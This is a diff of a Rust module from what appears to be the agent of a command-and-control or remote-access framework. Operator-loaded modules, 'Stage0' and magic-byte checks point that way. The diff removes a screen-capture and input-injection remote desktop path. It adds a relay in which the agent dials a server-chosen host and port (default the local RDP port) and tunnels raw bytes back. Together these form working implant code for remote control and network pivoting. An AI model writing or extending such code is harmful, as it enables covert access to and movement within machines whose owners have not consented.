@@ -1,281 +1,212 @@
-//! Yamux DESKTOP (0x0D) thin bridge.
+//! Yamux DESKTOP (0x0D) thin bridge — **RDP port-forward**, module-gated.
 //!
-//! **Product path (standard Agent):** load L2 `desktop` module first → this bridge
-//! calls `mod_stream_*` exports. No `feature=desktop` required on Stage0.
+//! Product flow:
+//! 1. Operator stages+loads L2 `desktop` from Module panel
+//! 2. Server opens Yamux type DESKTOP, sends `[host_len][host][port_be]`
+//! 3. This bridge dials agent-side target (default 127.0.0.1:3389) and pipes bytes
 //!
-//! **Optional:** with `feature=desktop` and no module loaded, fall back to in-process
-//! `desktop_engine` (full-gui / lab builds only).
+//! Stage0 does **not** embed GDI/JPEG capture. Capability is opt-in via L2 module.
 
-use super::desktop_proto::*;
-use futures_util::{AsyncReadExt, AsyncWriteExt};
+use std::time::Duration;
+use tokio::io::{AsyncReadExt as TokioRead, AsyncWriteExt as TokioWrite};
+use tokio::net::TcpStream;
+use tokio_util::compat::FuturesAsyncReadCompatExt;
 use yamux::Stream;
 
-/// Handle an inbound Yamux stream already typed as DESKTOP.
-pub async fn handle_stream(mut stream: Stream) {
-    let first = match read_message(&mut stream).await {
-        Ok(m) => m,
-        Err(ReadErr::SilentClose) => {
-            crate::utils::db_print("[desktop_bridge] silent close");
-            return;
-        }
-        Err(_) => return,
-    };
-
-    let (fps, quality, max_w, encode) = parse_hello_payload(&first.1);
-    if encode == "h264" {
-        crate::utils::db_print("[desktop_bridge] h264 requested → jpeg path");
-    }
-
-    // 1) Prefer L2 module (operator: Module panel → load desktop)
+/// Handle inbound Yamux stream already typed as DESKTOP (0x0D).
+/// Failures close **only this stream** — agent process stays alive.
+pub async fn handle_stream(stream: Stream) {
     #[cfg(feature = "module-loader")]
-    if let Some(api) = crate::module_loader::desktop_stream_api() {
-        crate::utils::db_print("[desktop_bridge] using L2 mod_desktop stream API");
-        run_module_session(&mut stream, api, fps, quality, max_w).await;
+    {
+        if !crate::module_loader::desktop_module_ready() {
+            crate::utils::db_print(
+                "[desktop_bridge] module 'desktop' not loaded — reject (load from Module panel)",
+            );
+            // Consume optional target frame then NACK so server surfaces a clear error.
+            let mut s = stream.compat();
+            let _ = read_target_skip(&mut s).await;
+            let _ = s.write_all(&[0x00]).await;
+            return;
+        }
+        crate::utils::db_print("[desktop_bridge] desktop module loaded — RDP relay");
+        run_rdp_relay(stream).await;
         return;
     }
 
-    // 2) Optional in-process engine (Stage0 built with feature=desktop)
-    #[cfg(feature = "desktop")]
+    #[cfg(not(feature = "module-loader"))]
     {
-        crate::utils::db_print("[desktop_bridge] no L2 module; feature=desktop in-process engine");
-        run_engine_session(&mut stream, fps, quality, max_w).await;
-        return;
-    }
-
-    // 3) Fail closed with explicit operator-facing code
-    #[cfg(not(feature = "desktop"))]
-    {
-        let _ = write_error(
-            &mut stream,
-            "module_not_loaded",
-            "load L2 module 'desktop' from Module panel first, then reconnect",
-        )
-        .await;
+        crate::utils::db_print("[desktop_bridge] no module-loader in this profile");
+        let mut s = stream.compat();
+        let _ = read_target_skip(&mut s).await;
+        let _ = s.write_all(&[0x00]).await;
     }
 }
 
-#[cfg(feature = "module-loader")]
-async fn run_module_session(
-    stream: &mut Stream,
-    api: crate::module_loader::DesktopStreamApi,
-    fps: u32,
-    quality: u32,
-    max_w: u32,
-) {
-    // Pass knobs via attach: pack max_w in high 16 bits? Module currently ignores token.
-    // Call attach with 0; module uses defaults then we could CONFIG — for MVP pass max_w via quality packing is ugly.
-    // Better: invoke attach after setting via re-export — mod_stream_attach uses fixed 1280.
-    // Fix L2 attach to accept parameters via session_token misuse is bad.
-    // Call attach(0); HELLO knobs applied if module reads them later.
-    let _ = (fps, quality, max_w);
-    let rc = unsafe { (api.attach)(0) };
-    if rc != 0 {
-        let _ = write_error(
-            stream,
-            "capture_failed",
-            &format!("mod_stream_attach rc={rc}"),
-        )
-        .await;
-        return;
-    }
+/// Idle window with no bytes either direction → close relay (DoS / orphan guard).
+const RELAY_IDLE_SECS: u64 = 120;
 
-    // HELLO_ACK minimal JSON (module may not export probe on stream path)
-    let ack = serde_json::json!({
-        "ok": true,
-        "w": max_w.min(1280).max(8),
-        "h": 720,
-        "encode": "jpeg",
-        "can_input": true,
-        "session": "l2-module",
-        "source": "mod_desktop",
-    });
-    // Prefer probe from module via mod_invoke if available — skip; first poll gives real dims
-    if let Some(msg) = encode_message(MSG_HELLO_ACK, 0, ack.to_string().as_bytes()) {
-        let _ = stream.write_all(&msg).await;
-    }
+/// Protocol (after type byte consumed by dispatcher):
+/// Server → Agent: [host_len u8][host bytes][port u16 BE]
+/// Agent → Server: 0x01 success | 0x00 fail
+/// then raw bidirectional TCP pipe (RDP).
+async fn run_rdp_relay(stream: Stream) {
+    let mut stream_compat = stream.compat();
 
-    loop {
-        // poll frame (blocking up to 100ms inside module)
-        let mut hdr_buf = [0u8; 16];
-        let mut hdr_len: u32 = 0;
-        let mut blob: *mut u8 = std::ptr::null_mut();
-        let mut blob_len: u32 = 0;
-        let prc = unsafe {
-            (api.poll_frame)(
-                0,
-                100,
-                hdr_buf.as_mut_ptr(),
-                hdr_buf.len() as u32,
-                &mut hdr_len,
-                &mut blob,
-                &mut blob_len,
-            )
-        };
-        if prc < 0 {
-            break;
-        }
-        if prc == 0 && blob_len > 0 && !blob.is_null() {
-            let payload =
-                unsafe { std::slice::from_raw_parts(blob, blob_len as usize) }.to_vec();
-            if let Some(free) = api.free {
-                unsafe { free(blob, blob_len) };
-            }
-            if let Some(msg) = encode_message(MSG_FRAME, 0, &payload) {
-                if stream.write_all(&msg).await.is_err() {
-                    break;
-                }
-            }
-        }
-
-        match tokio::time::timeout(std::time::Duration::from_millis(5), read_message(stream)).await
-        {
-            Ok(Ok((hdr, payload))) => match hdr.msg_type {
-                MSG_STOP => break,
-                MSG_INPUT => {
-                    let _ = unsafe { (api.push_input)(0, payload.as_ptr(), payload.len() as u32) };
-                }
-                MSG_PING => {
-                    if let Some(msg) = encode_message(MSG_PONG, 0, &payload) {
-                        let _ = stream.write_all(&msg).await;
-                    }
-                }
-                _ => {}
-            },
-            Ok(Err(ReadErr::SilentClose)) | Ok(Err(ReadErr::Eof)) | Ok(Err(ReadErr::Other)) => break,
-            Err(_) => {}
-        }
-    }
-
-    let _ = unsafe { (api.detach)(0) };
-    let _ = unsafe { (api.detach)(0) };
-    let _ = stream.close().await;
-    crate::utils::db_print("[desktop_bridge] L2 module session torn down");
-}
-
-#[cfg(feature = "desktop")]
-async fn run_engine_session(stream: &mut Stream, fps: u32, quality: u32, max_w: u32) {
-    use super::desktop_engine;
-    let token = match desktop_engine::stream_attach(max_w, fps, quality) {
-        Ok(t) => t,
-        Err(_) => {
-            let _ = write_error(stream, "capture_failed", "attach failed").await;
+    let (host, port) = match read_target(&mut stream_compat).await {
+        Ok(v) => v,
+        Err(e) => {
+            crate::utils::db_print(&format!("[desktop_bridge] bad target: {e}"));
+            let _ = stream_compat.write_all(&[0x00]).await;
             return;
         }
     };
-    let ack = desktop_engine::hello_ack_json();
-    if let Some(msg) = encode_message(MSG_HELLO_ACK, 0, ack.as_bytes()) {
-        let _ = stream.write_all(&msg).await;
+
+    let target = format!("{host}:{port}");
+    crate::utils::db_print(&format!("[desktop_bridge] dial {target}"));
+
+    let target_stream = match connect_target(&target).await {
+        Ok(s) => s,
+        Err(_) => {
+            let _ = stream_compat.write_all(&[0x00]).await;
+            return;
+        }
+    };
+
+    if stream_compat.write_all(&[0x01]).await.is_err() {
+        return;
     }
+
+    let (mut y_r, mut y_w) = tokio::io::split(stream_compat);
+    let (mut t_r, mut t_w) = target_stream.into_split();
+    let idle = Duration::from_secs(RELAY_IDLE_SECS);
+
+    let c2t = async {
+        let _ = copy_with_idle(&mut y_r, &mut t_w, idle).await;
+    };
+    let t2c = async {
+        let _ = copy_with_idle(&mut t_r, &mut y_w, idle).await;
+    };
+    tokio::join!(c2t, t2c);
+    crate::utils::db_print(&format!("[desktop_bridge] relay closed {target}"));
+}
+
+/// Bidirectional half-copy with per-read idle timeout. Any successful read
+/// resets the idle window; 120s with no data ends the relay half.
+async fn copy_with_idle<R, W>(
+    reader: &mut R,
+    writer: &mut W,
+    idle: Duration,
+) -> std::io::Result<u64>
+where
+    R: TokioRead + Unpin,
+    W: TokioWrite + Unpin,
+{
+    let mut buf = [0u8; 16 * 1024];
+    let mut total = 0u64;
     loop {
-        match desktop_engine::stream_poll_frame(token, 100) {
-            Ok(Some(payload)) => {
-                if let Some(msg) = encode_message(MSG_FRAME, 0, &payload) {
-                    if stream.write_all(&msg).await.is_err() {
-                        break;
-                    }
-                }
+        let n = match tokio::time::timeout(idle, reader.read(&mut buf)).await {
+            Ok(Ok(0)) => return Ok(total),
+            Ok(Ok(n)) => n,
+            Ok(Err(e)) => return Err(e),
+            Err(_) => {
+                return Err(std::io::Error::new(
+                    std::io::ErrorKind::TimedOut,
+                    "desktop relay idle timeout",
+                ));
             }
-            Ok(None) => {}
-            Err(_) => break,
-        }
-        match tokio::time::timeout(std::time::Duration::from_millis(5), read_message(stream)).await
-        {
-            Ok(Ok((hdr, payload))) => match hdr.msg_type {
-                MSG_STOP => break,
-                MSG_INPUT => {
-                    let _ = desktop_engine::stream_push_input(token, &payload);
-                }
-                MSG_PING => {
-                    if let Some(msg) = encode_message(MSG_PONG, 0, &payload) {
-                        let _ = stream.write_all(&msg).await;
-                    }
-                }
-                _ => {}
-            },
-            Ok(Err(_)) => break,
-            Err(_) => {}
-        }
-    }
-    let _ = desktop_engine::stream_detach(token);
-    let _ = desktop_engine::stream_detach(token);
-    let _ = stream.close().await;
-}
-
-enum ReadErr {
-    SilentClose,
-    Eof,
-    Other,
-}
-
-async fn read_message(stream: &mut Stream) -> Result<(EnvelopeHeader, Vec<u8>), ReadErr> {
-    let mut hdr = [0u8; DESKTOP_HEADER_LEN];
-    if stream.read_exact(&mut hdr).await.is_err() {
-        return Err(ReadErr::Eof);
-    }
-    match parse_header(&hdr) {
-        Ok(env) => {
-            let mut payload = vec![0u8; env.payload_len as usize];
-            if env.payload_len > 0 && stream.read_exact(&mut payload).await.is_err() {
-                return Err(ReadErr::Eof);
-            }
-            Ok((env, payload))
-        }
-        Err(ParseHeaderError::SilentClose) => Err(ReadErr::SilentClose),
-        Err(ParseHeaderError::PayloadTooLarge) => Err(ReadErr::Other),
-        Err(ParseHeaderError::Truncated) => Err(ReadErr::Eof),
+        };
+        writer.write_all(&buf[..n]).await?;
+        writer.flush().await?;
+        total += n as u64;
     }
 }
 
-async fn write_error(stream: &mut Stream, code: &str, msg: &str) {
-    let body = format!(r#"{{"code":"{}","msg":"{}"}}"#, code, msg);
-    if let Some(m) = encode_message(MSG_ERROR, 0, body.as_bytes()) {
-        let _ = stream.write_all(&m).await;
+async fn read_target<S: TokioRead + Unpin>(s: &mut S) -> Result<(String, u16), &'static str> {
+    let mut len_buf = [0u8; 1];
+    s.read_exact(&mut len_buf).await.map_err(|_| "host_len")?;
+    let host_len = len_buf[0] as usize;
+    if host_len == 0 || host_len > 255 {
+        return Err("invalid host_len");
     }
-    let _ = stream.close().await;
+    let mut host_buf = vec![0u8; host_len];
+    s.read_exact(&mut host_buf).await.map_err(|_| "host")?;
+    let host = String::from_utf8_lossy(&host_buf).into_owned();
+    let mut port_buf = [0u8; 2];
+    s.read_exact(&mut port_buf).await.map_err(|_| "port")?;
+    let port = u16::from_be_bytes(port_buf);
+    Ok((host, port))
 }
 
-fn parse_hello_payload(payload: &[u8]) -> (u32, u32, u32, String) {
-    let mut fps = 5u32;
-    let mut quality = 75u32;
-    let mut max_w = 1280u32;
-    let mut encode = "jpeg".to_string();
-    if let Ok(v) = serde_json::from_slice::<serde_json::Value>(payload) {
-        if let Some(n) = v.get("fps").and_then(|x| x.as_u64()) {
-            fps = n as u32;
+/// Best-effort drain of target header when rejecting early.
+async fn read_target_skip<S: TokioRead + Unpin>(s: &mut S) {
+    let mut len_buf = [0u8; 1];
+    if s.read_exact(&mut len_buf).await.is_err() {
+        return;
+    }
+    let n = len_buf[0] as usize;
+    if n == 0 || n > 255 {
+        return;
+    }
+    let mut buf = vec![0u8; n + 2];
+    let _ = s.read_exact(&mut buf).await;
+}
+
+async fn connect_target(addr: &str) -> Result<TcpStream, ()> {
+    match tokio::time::timeout(Duration::from_secs(15), TcpStream::connect(addr)).await {
+        Ok(Ok(s)) => {
+            let _ = s.set_nodelay(true);
+            Ok(s)
         }
-        if let Some(n) = v.get("quality").and_then(|x| x.as_u64()) {
-            quality = n as u32;
+        Ok(Err(e)) => {
+            crate::utils::db_print(&format!("[desktop_bridge] connect {addr}: {e}"));
+            Err(())
         }
-        if let Some(n) = v.get("max_w").and_then(|x| x.as_u64()) {
-            max_w = n as u32;
-        }
-        if let Some(s) = v.get("encode").and_then(|x| x.as_str()) {
-            encode = s.to_string();
+        Err(_) => {
+            crate::utils::db_print(&format!("[desktop_bridge] connect timeout {addr}"));
+            Err(())
         }
     }
-    (fps, quality, max_w, encode)
 }
 
 #[cfg(test)]
 mod tests {
     use super::*;
+    use tokio::io::duplex;
 
-    #[test]
-    fn hello_parse_defaults() {
-        let (f, q, w, e) = parse_hello_payload(br#"{"fps":3,"encode":"h264"}"#);
-        assert_eq!(f, 3);
-        assert_eq!(e, "h264");
-        assert_eq!(q, 75);
-        assert_eq!(w, 1280);
+    #[tokio::test]
+    async fn copy_with_idle_times_out_without_data() {
+        let (mut client, mut server) = duplex(64);
+        // Reader side never gets data → idle timeout
+        let idle = Duration::from_millis(50);
+        let result = copy_with_idle(&mut server, &mut client, idle).await;
+        assert!(result.is_err());
+        let err = result.unwrap_err();
+        assert_eq!(err.kind(), std::io::ErrorKind::TimedOut);
+    }
+
+    #[tokio::test]
+    async fn copy_with_idle_forwards_bytes() {
+        // duplex ends are opposite sides of the pipe: write to `src_w`, read from `src_r`.
+        let (mut src_w, mut src_r) = duplex(1024);
+        let (mut dst_w, mut dst_r) = duplex(1024);
+        let idle = Duration::from_secs(2);
+        let send = tokio::spawn(async move {
+            src_w.write_all(b"rdp-frame").await.unwrap();
+            // Half-close write so the reader sees EOF after the payload.
+            drop(src_w);
+        });
+        let n = copy_with_idle(&mut src_r, &mut dst_w, idle)
+            .await
+            .expect("copy");
+        assert_eq!(n, 9);
+        send.await.unwrap();
+        let mut got = vec![0u8; 9];
+        dst_r.read_exact(&mut got).await.unwrap();
+        assert_eq!(&got, b"rdp-frame");
     }
 
     #[test]
-    fn silent_close_on_bad_magic_via_parse() {
-        let mut bad = encode_message(MSG_HELLO, 0, b"{}").unwrap();
-        bad[1] = b'Z';
-        assert!(matches!(
-            parse_header(&bad),
-            Err(ParseHeaderError::SilentClose)
-        ));
+    fn relay_idle_is_120s() {
+        assert_eq!(RELAY_IDLE_SECS, 120);
     }
 }
